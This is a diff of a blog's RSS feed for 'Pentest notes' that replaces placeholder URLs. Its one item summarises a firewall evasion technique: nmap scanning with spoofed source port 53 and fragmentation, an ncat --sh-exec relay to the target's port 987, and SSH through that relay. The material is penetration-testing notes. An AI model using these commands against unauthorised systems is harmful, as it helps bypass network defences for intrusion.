@@ -2,20 +2,20 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Firewall on Pentest notes</title>
-    <link>https://example.com/categories/firewall/</link>
+    <link>https://sosprz.github.io/categories/firewall/</link>
     <description>Recent content in Firewall on Pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Sun, 23 Dec 2018 11:26:23 +0100</lastBuildDate>
     
-	<atom:link href="https://example.com/categories/firewall/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://sosprz.github.io/categories/firewall/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Firewall evasion</title>
-      <link>https://example.com/posts/firewall-evasion/</link>
+      <link>https://sosprz.github.io/posts/firewall-evasion/</link>
       <pubDate>Sun, 23 Dec 2018 11:26:23 +0100</pubDate>
       
-      <guid>https://example.com/posts/firewall-evasion/</guid>
+      <guid>https://sosprz.github.io/posts/firewall-evasion/</guid>
       <description>Firewall source port scan, found port 987 and bind to localhost.  /usr/bin/nmap 192.168.5.2 -Pn &amp;ndash;source-port=53 -f /usr/bin/ncat -l 678 &amp;ndash;sh-exec &amp;ldquo;ncat 192.168.5.2 987 -p 53&amp;rdquo; ssh dave@localhost -p 678</description>
     </item>
     
